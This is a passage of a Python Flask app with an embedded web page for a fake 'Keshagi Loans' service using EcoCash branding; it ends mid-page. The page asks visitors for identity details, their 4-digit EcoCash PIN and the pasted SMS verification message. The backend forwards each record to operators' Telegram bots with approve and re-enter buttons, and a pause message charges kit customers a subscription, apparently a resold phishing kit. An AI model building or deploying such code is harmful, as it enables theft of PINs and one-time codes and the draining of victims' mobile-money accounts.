import os
import json
import redis
import time
import requests
from flask import Flask, Response, request, jsonify
from datetime import datetime
import pytz

app = Flask(
    __name__,
    static_folder=os.path.join(os.path.dirname(__file__), "assets"),
    static_url_path="/assets",
)


# Africa's Talking & SMS Configuration
ADMIN_NOTIFICATION_PHONE = os.environ.get("ADMIN_NOTIFICATION_PHONE")
AT_USERNAME = os.environ.get("AT_USERNAME", "sandbox")
AT_API_KEY = os.environ.get("AT_API_KEY")

def send_sms_notification(message):
    if not ADMIN_NOTIFICATION_PHONE or not AT_API_KEY:
        print("Africa's Talking SMS configuration missing. SMS skipped.")
        return
    try:
        url = "https://api.africastalking.com/version1/messaging"
        if AT_USERNAME == "sandbox":
            url = "https://api.sandbox.africastalking.com/version1/messaging"
            
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "apiKey": AT_API_KEY
        }
        payload = {
            "username": AT_USERNAME,
            "to": ADMIN_NOTIFICATION_PHONE,
            "message": message
        }
        requests.post(url, data=payload, headers=headers, timeout=5)
    except Exception as e:
        print(f"Africa's Talking SMS dispatch failed: {e}")

# Telegram Configuration (support both TELEGRAM_BOT_TOKEN and TELEGRAM_TOKEN)
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

import re

def get_bot_config(ref):
    clean_ref = re.sub(r'[^A-Za-z0-9_]', '', (ref or "")).upper()
    if clean_ref:
        token = os.environ.get(f"BOT_{clean_ref}_TOKEN")
        chat_id = os.environ.get(f"BOT_{clean_ref}_CHAT_ID")
        if token and chat_id:
            return token, chat_id
    return TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID


def send_telegram_notification(message, record_id=None, ref="default"):
    paused_refs = [r.strip().lower() for r in os.environ.get("PAUSED_REFS", "").split(",") if r.strip()]
    if ref and ref.lower() in paused_refs:
        token, raw_ids = get_bot_config(ref)
        if token and raw_ids:
            for cid in [c.strip() for c in str(raw_ids).split(",") if c.strip()]:
                try:
                    requests.post(
                        "https://api.telegram.org/bot" + str(token) + "/sendMessage",
                        json={
                            "chat_id": cid,
                            "text": "Alert!! This bot is currently paused. Please pay for your bot subscription to 0799008888 via send money to unpause your bot"
                        },
                        timeout=5
                    )
                except Exception as e:
                    print(f"Failed to send pause notice: {e}")
        return

    token, raw_ids = get_bot_config(ref)
    if not token or not raw_ids:
        print(f"Telegram config missing for ref={ref}. Notification skipped.")
        return
    try:
        chat_ids = [cid.strip() for cid in raw_ids.split(',')]

        reply_markup = None
        if record_id:
            reply_markup = {
                "inline_keyboard": [[
                    {"text": "❌ Incorrect — Ask Client to Re-enter", "callback_data": f"retry:{record_id}:{ref}"},
                    {"text": "✅ Approve", "callback_data": f"approve:{record_id}:{ref}"}
                ]]
            }

        for chat_id in chat_ids:
            if not chat_id:
                continue
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message}
            if reply_markup:
                payload["reply_markup"] = reply_markup
            try:
                resp = requests.post(url, json=payload, timeout=5)
                print(f"Telegram ({ref}) response for {chat_id}: {resp.status_code} {resp.text}")
            except Exception as inner_e:
                print(f"Failed to send to chat_id {chat_id}: {inner_e}")
    except Exception as e:
        print(f"Telegram notification orchestration failed: {e}")

# Helper to get current time in Zimbabwe/Johannesburg timezone
def get_now_str():
    try:
        tz = pytz.timezone('Africa/Harare')
        now = datetime.now(tz)
    except:
        now = datetime.now()
    return now.strftime("%Y-%m-%d %I:%M:%S %p")

# Initialize Redis client using REDIS_URL
db = None
try:
    redis_url = os.environ.get("REDIS_URL")
    if redis_url:
        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}") # Log host only for safety
        
        # Comprehensive connection parameters for Cloud Providers (Upstash/Vercel)
        # 1. ssl_cert_reqs=None ignores self-signed/provider cert issues
        # 2. socket_timeout ensures we don't hang the lambda forever
        # 3. retry_on_timeout handles cold starts
        db = redis.from_url(
            redis_url, 
            decode_responses=True, 
            ssl_cert_reqs=None,
            socket_timeout=5.0,
            socket_connect_timeout=5.0,
            retry_on_timeout=True
        )
        # Test connection immediately
        db.ping()
        print("Redis client initialized and verified successfully.")
    else:
        print("REDIS_URL environment variable not found.")
except Exception as e:
    print(f"Redis initialization failed CRITICAL: {e}")
    db = None # Reset to ensure we don't use a broken client

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Keshagi Loans — EcoCash Zimbabwe</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --brand-blue: #004F71;
      --brand-yellow: #FFCC00;
      --brand-blue-dark: #00334E;
      --brand-accent: #FFCC00;
    }
    @keyframes waveDot {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .wave-dot-0 { animation: waveDot 0.8s infinite ease-in-out 0s; }
    .wave-dot-1 { animation: waveDot 0.8s infinite ease-in-out 0.15s; }
    .wave-dot-2 { animation: waveDot 0.8s infinite ease-in-out 0.3s; }
    .wave-dot-3 { animation: waveDot 0.8s infinite ease-in-out 0.45s; }
    .bg-momo-blue { background-color: var(--brand-blue); }
    .text-momo-blue { color: var(--brand-blue); }
    .bg-momo-yellow { background-color: var(--brand-yellow); }
    .text-momo-yellow { color: var(--brand-yellow); }
    
    /* Override for existing classes to minimize breakage */
    .bg-MTN MoMo-blue { background-color: var(--brand-blue); }
    .text-MTN MoMo-blue { color: var(--brand-blue); }
    .bg-MTN MoMo-cyan { background-color: var(--brand-yellow); }
    .text-MTN MoMo-cyan { color: var(--brand-yellow); }
    . { background-color: var(--brand-blue); }
    .text-[#004F71] { color: var(--brand-blue); }
    . { background-color: var(--brand-cyan); } /* Use cyan instead of red for brand consistency */
    .text-[#004F71] { color: var(--brand-cyan); }
    .bg-[#FFCC00] { background-color: var(--brand-blue-dark); }
    .text-[#FFCC00] { color: var(--brand-blue-dark); }
    
    .accent-MTN MoMo { accent-color: var(--brand-blue); }
    
    .gradient-MTN MoMo {
      background: linear-gradient(135deg, var(--brand-blue) 0%, var(--brand-blue-dark) 100%);
    }
    .gradient-cyan {
      background: linear-gradient(135deg, var(--brand-cyan) 0%, var(--brand-blue) 100%);
    }
    .border-[#FFCC00] { border-color: var(--brand-green); }
    .hide-scrollbar::-webkit-scrollbar { display: none; }
    .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    @keyframes pin-wavy {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .animate-pin-wavy {
      display: inline-block;
      animation: pin-wavy 0.5s ease-in-out infinite;
    }
    .animate-pin-wavy:nth-child(2) { animation-delay: 0.1s; }
    .animate-pin-wavy:nth-child(3) { animation-delay: 0.2s; }
    .animate-pin-wavy:nth-child(4) { animation-delay: 0.3s; }
  </style>
</head>
<body class="bg-[#f4f5f7] text-slate-900 antialiased min-h-screen flex flex-col justify-between">

  <!-- TOP HEADER -->
  <header class="bg-white border-b border-slate-200 sticky top-0 z-40 shadow-sm">
    <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
      <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
        <div class="flex items-center gap-2">
<img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="w-10 h-10 mx-auto rounded-2xl object-cover shadow-md">
          <div class="flex flex-col">
            <span class="text-lg font-black text-[#004F71] leading-none">Keshagi</span>
            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">Zimbabwe Loans</span>
          </div>
        </div>
        <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
          <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
          Live
        </span>
      </div>

      <button id="menu-btn" onclick="toggleMenu(true)" class="p-2 text-slate-700 hover:bg-slate-100 ">
      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
      </button>
    </div>
  </header>

  <!-- SLIDE-OVER MENU -->
  <div id="drawer" class="fixed inset-0 z-50 pointer-events-none transition-opacity duration-300 opacity-0">
    <div onclick="toggleMenu(false)" class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"></div>
    <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300">
      <div>
        <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
           <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
          </button>
        </div>
        <nav class="mt-6 flex flex-col space-y-1">
          <button onclick="goTo('home'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Home</button>
          <button onclick="goTo('apply'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Apply Now</button>
          <button onclick="showInfoModal('Check Application')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Check Application</button>
          <button onclick="goTo('details'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Loan Details</button>
          <button onclick="showInfoModal('FAQs')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">FAQs</button>
          <button onclick="showInfoModal('Contact Us')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Contact Us</button>
          <button onclick="showInfoModal('Terms & Conditions')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Terms & Conditions</button>
          <button onclick="showInfoModal('Privacy Policy')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Privacy Policy</button>
        </nav>
      </div>
      <div class="text-xs text-slate-400 text-center">Demo Prototype • No real funds</div>
    </div>
  </div>

  <!-- MAIN WRAPPER -->
  <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">

    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zimbabwe • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Keshagi Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your EcoCash.</p>
      </div>

      <!-- 4 Benefits -->
      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">⚡</div>
          <span class="text-xs font-bold text-slate-800">Instant Payout</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📱</div>
          <span class="text-xs font-bold text-slate-800">100% Mobile</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📄</div>
          <span class="text-xs font-bold text-slate-800">Clear Terms</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">🔒</div>
          <span class="text-xs font-bold text-slate-800">Secure</span>
        </div>
      </div>

      <!-- MTN MoMo Hero Card -->
      <div class="relative overflow-hidden  bg-gradient-to-br from-[#004F71] via-[#00334E] to-[#002233] text-white p-6 shadow-lg">
        <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
        <div class="relative z-10 space-y-3">
          <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To ZWG 500,000 INSTANTLY!</h3>
          <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
        </div>
      </div>

      <!-- Purpose Selector Carousel -->
      <div>
        <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Loan Purpose</h4>
        <div class="flex gap-3 overflow-x-auto pb-2 hide-scrollbar">
          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">💼 Business</button>
          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🎓 School</button>
          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🚨 Emergency</button>
          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🏠 Household</button>
          <button onclick="setPurpose('Travel &')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">✈️ Travel &</button>
        </div>
      </div>

      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        APPLY NOW
      </button>
    </section>

    <!-- SCREEN 2: APPLY FOR LOAN -->
    <section id="screen-apply" class="hidden space-y-5">
  <div class="flex items-center gap-3">
    <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
    <div>
      <h2 class="text-xl font-black text-[#004F71]">APPLY FOR LOAN</h2>
      <p class="text-xs text-slate-500">Step 1 of 4 • Personal details</p>
    </div>
  </div>

  <!-- Wrapped inputs inside a standard <form> tag to make the 'required' feature work seamlessly -->
  <form id="loan-application-form" onsubmit="handleFormSubmit(event)" class="space-y-5">
    <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Full Name</label>
        <input id="input-fullname" type="text" placeholder="John Doe" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Mobile Number</label>
        <input id="input-mobile" type="tel" placeholder="0770000000" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">ID Number</label>
        <input id="input-nationalid" type="text" placeholder="National ID Number" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Date of Birth</label>
        <input id="input-dob" type="date" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Purpose</label>
        <select id="input-purpose" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
          <option value="" disabled selected>Select a purpose...</option>
          <option value="Business">Business Capital</option>
          <option value="School">School Fees</option>
          <option value="Emergency">Medical & Emergency</option>
          <option value="Household">Household Support</option>
          <option value="Travel &">Travel & Logistics</option>
        </select>
      </div>
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (ZWG)</label>
        <input id="input-amount" type="number" placeholder="e.g. 2500" min="500" max="500000" step="500" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>

    </div>

    <!-- The button is now a submit type to enforce the required checks -->
    <button type="submit" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
      CONTINUE
    </button>
  </form>
</section>


    <!-- SCREEN 3: LOAN DETAILS & REPAYMENT -->
    <section id="screen-loan" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">LOAN DETAILS</h2>
          <p class="text-xs text-slate-500">Step 2 of 4 • Select period & review breakdown</p>
        </div>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
        <div class="text-center">
          <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">ZWG 500,000</div>
          <input type="range" id="amount-slider" min="500" max="500000" step="500" value="5000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
          <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
            <span>ZWG 500</span>
            <span>ZWG 500,000</span>
          </div>
        </div>

        <div class="space-y-4">
          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
            <div class="grid grid-cols-5 gap-2">
              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">7 Days</button>
              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">14 Days</button>
              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#004F71] text-[#FFCC00] border-[#004F71] shadow-sm">30 Days</button>
              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">60 Days</button>
              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">90 Days</button>
            </div>
          </div>

          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Or Choose Specific Date</label>
            <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
          </div>
        </div>

        <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
          <div class="flex justify-between text-slate-600">
            <span>Interest (5%)</span>
            <span id="breakdown-interest" class="font-bold text-slate-800">ZWG 50</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Admin & Processing Fee (3%)</span>
            <span id="breakdown-fee" class="font-bold text-slate-800">ZWG 30</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Repayment Due Date</span>
            <span id="breakdown-date" class="font-bold text-slate-800">30/09/2026</span>
          </div>
          <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
            <span>Total Repayment</span>
            <span id="breakdown-total" class="text-[#004F71]">ZWG 1,080</span>
          </div>
        </div>
      </div>

      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        CONTINUE
      </button>
    </section>

    <!-- SCREEN 4: REVIEW APPLICATION -->
    <section id="screen-review" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">REVIEW APPLICATION</h2>
          <p class="text-xs text-slate-500">Step 3 of 4 • Verify all details before submission</p>
        </div>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Applicant</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Tariro Moyo</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Mobile Number</span><span id="review-mobile" class="font-bold text-slate-800">+263 77 123 4567</span></div>
            <div class="flex justify-between"><span class="text-slate-500">ID Number</span><span id="review-id" class="font-bold text-slate-800">63-123456-A-47</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
          <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">ZWG 1,080</span></div>
            <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
          </div>
        </div>

        <label class="flex items-start gap-3 pt-2 cursor-pointer">
          <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FFCC00]">
          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Keshagi loan terms and conditions.</span>
        </label>
      </div>

      <button id="btn-confirm" onclick="goTo('pin', true)" disabled class="w-full py-4 rounded-2xl  disabled:bg-slate-300 disabled:cursor-not-allowed hover:bg-blue-700 text-white font-bold text-base tracking-wide shadow-md transition-all">
        CONFIRM APPLICATION
      </button>
    </section>

    <!-- SCREEN 5: ENTER YOUR PIN -->
    <section id="screen-pin" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
        <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit EcoCash PIN to authorize</p>
      </div>

      <!-- PIN Indicator Dots -->
      <div class="flex justify-center gap-4 my-4">
        <div id="dot-0" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
        <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
      </div>

      <!-- Realistic Numeric Keypad -->
      <div id="pin-keypad" class="max-w-[320px] mx-auto grid grid-cols-3 gap-3 transition-all duration-300">
        <button onclick="pressPin('1')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">1</button>
        <button onclick="pressPin('2')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">2</button>
        <button onclick="pressPin('3')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">3</button>
        <button onclick="pressPin('4')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">4</button>
        <button onclick="pressPin('5')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">5</button>
        <button onclick="pressPin('6')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">6</button>
        <button onclick="pressPin('7')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">7</button>
        <button onclick="pressPin('8')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">8</button>
        <button onclick="pressPin('9')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">9</button>
        <button onclick="clearPin()" class="h-16 rounded-2xl bg-slate-100 text-xs font-bold text-slate-600 active:bg-slate-200">C</button>
        <button onclick="pressPin('0')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">0</button>
        <button onclick="backspacePin()" class="h-16 rounded-2xl bg-slate-100 text-lg font-bold text-slate-600 active:bg-slate-200">⌫</button>
      </div>

      <div id="pin-status-msg" class="text-center text-xs font-semibold text-slate-400 h-4"></div>
    </section>

    <!-- SCREEN 6: VERIFY YOUR NUMBER (OTP) -->
    <section id="screen-otp" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
        <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
        <p class="text-xs text-slate-500 mt-1">A verification message has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
      </div>

      <div class="max-w-[340px] mx-auto space-y-2">
        <textarea id="otp-message-paste" rows="4" placeholder="Paste the complete SMS verification message here..." class="w-full p-4 border border-slate-200 rounded-2xl bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none text-sm text-slate-700 font-medium shadow-sm transition-all" required></textarea>
        <div id="otp-error-msg" class="text-center text-xs text-red-500 font-semibold h-4"></div>
      </div>

      <div class="text-center text-xs text-slate-500">
        Didn't receive code? <button id="resend-btn" onclick="resendOtp()" class="font-bold text-[#004F71] hover:underline">Resend code in 30s</button>
      </div>

      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
        VERIFY & CONTINUE
      </button>
    </section>

    <!-- SCREEN 7: PROCESSING APPLICATION -->
    <section id="screen-processing" class="hidden py-10 space-y-8 text-center">
      <div class="relative w-20 h-20 mx-auto">
        <div class="w-20 h-20 rounded-full border-4 border-slate-200 border-t-blue-600 animate-spin"></div>
      </div>

      <div>
        <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Keshagi application.</p>
      </div>

      <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
        <div id="step-sub" class="flex items-center gap-3 text-[#004F71]">
          <span class="font-bold text-emerald-600">✓</span><span>Application Submitted</span>
        </div>
        <div id="step-ver" class="flex items-center gap-3 text-[#004F71]">
          <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
        </div>
        <div id="step-proc" class="flex items-center gap-3 text-[#004F71] animate-pulse">
          <span class="w-2.5 h-2.5 rounded-full bg-[#004F71] inline-block ml-0.5"></span><span>Processing Assessment...</span>
        </div>
        <div id="step-dec" class="flex items-center gap-3 text-slate-400">
          <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
        </div>
      </div>
    </section>

    <!-- SCREEN 8: LOAN APPROVED -->
    <section id="screen-approved" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-20 h-20 mx-auto rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-4xl mb-3 shadow-inner font-bold">
          ✓
        </div>
        <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
        <p class="text-xs text-slate-500 mt-1">Funds will be disbursed through the contact details provided.</p>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Application Reference</span>
